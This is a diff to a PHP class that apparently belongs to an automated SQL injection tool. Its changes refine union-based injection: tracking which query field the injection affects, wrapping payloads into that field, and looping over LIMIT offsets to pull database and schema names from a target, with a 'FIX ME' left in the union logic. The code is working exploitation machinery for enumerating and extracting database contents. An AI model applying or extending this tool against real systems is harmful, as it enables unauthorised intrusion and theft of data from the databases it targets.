@@ -91,7 +91,9 @@
 				$return	=	array();
 
 				foreach($wrapMe as $key=>$wrapIt){
+
 					$return[]	=	$this->wrap($wrapping,$wrapIt);
+
 				}
 
 				return $return;
@@ -153,7 +155,7 @@
 					if($offset>1){
 
 						for($i=0;$i<$offset;$i++){
-							$iterationContainer[]	=	$offset;
+							$iterationContainer[]	=	$i;
 						}
 
 					}
@@ -200,7 +202,7 @@
 
 										$this->_queryBuilder->setSQL($sql);
 
-										$result			=	$this->query($requestVariable,$callback);
+										$result	=	$this->query($requestVariable,$callback);
 
 										if($result){
 
@@ -211,17 +213,18 @@
 											}
 
 											$injectionParameters	=	array(
-																				"index"				=>	$maxFields,	
-																				"fieldValues"		=>	$iterationContainer,
-																				"requestVariable"	=>	$requestVariable,
-																				"requestValue"		=>	$madeUpValue,
-																				"requestVariables"=> $requestVariables,
-																				"wrapping"			=>	$wrapping,
-																				"payload"			=>	$payLoad,		//constant
-																				"limit"				=>	$limit,			//variable 
-																				"order"				=>	$order,			//variable
-																				"comment"			=>	$comment,		//constant
-																				"callback"			=>	$callback
+																				"index"						=>	$maxFields,	
+																				"fieldValues"				=>	$iterationContainer,
+																				"requestVariable"			=>	$requestVariable,
+																				"requestValue"				=>	$madeUpValue,
+																				"requestVariables"		=> $requestVariables,
+																				"wrapping"					=>	$wrapping,
+																				"payload"					=>	$payLoad,		//constant
+																				"limit"						=>	$limit,			//variable 
+																				"order"						=>	$order,			//variable
+																				"comment"					=>	$comment,		//constant
+																				"callback"					=>	$callback,
+																				"affectedQueryField"		=> $result[0]
 											);
 
 											$this->setInjectionParameters($injectionParameters);
@@ -252,15 +255,23 @@
 
 			}
 
+
 			public function unionQuery($value,$from=NULL,Array $where=array(),Array $group=array()){
 
-				$params	=	&$this->_injection;
+				$params	=	$this->_injection;
 
-				foreach($params["fieldValues"] as &$val){
-					$val	=	$value;	
+				foreach($params["fieldValues"] as $key=>&$val){
+
+					//FIX ME
+					if($val==$this->_injection["affectedQueryField"]){
+
+						$val	=	$this->wrap($params["wrapping"],$value);	
+
+					}
+
 				}
 
-				$params["fieldValues"]	=	$this->wrapArray($params["fieldValues"],$params["wrapping"]);
+				//$params["fieldValues"]	=	$this->wrapArray($params["fieldValues"],$params["wrapping"]);
 
 				$this->_queryBuilder->union($params["fieldValues"],"ALL");
 
@@ -364,7 +375,7 @@
 				for($i=0;$i<=$count;$i++){
 
 					$this->_injection["limit"]	=	array($i,1);
-					$result		=	$this->unionQuery($value,$from,$where,$group);	
+					$result			=	$this->unionQuery($value,$from,$where,$group);	
 					$results[$i]	=	$result[0];
 
 				}
@@ -393,6 +404,7 @@
 				switch($this->_config["all"]["wanted-schemas"]){
 
 					case "{current}":
+						$injection	=	NULL;
 						$databases	=	$currentDatabase;
 						break;
 
@@ -427,7 +439,7 @@
 				//However if we detect that the data we fetched is truncated, we are forced 
 				//to perform a few 10ths or 100ths of more queries :(
 
-				if($this->detectTruncatedData($databases)){
+				if(!$injection&&$this->detectTruncatedData($databases)){
 
 					$databases	=	$this->unionQueryIterateLimit($injection,$from);
 
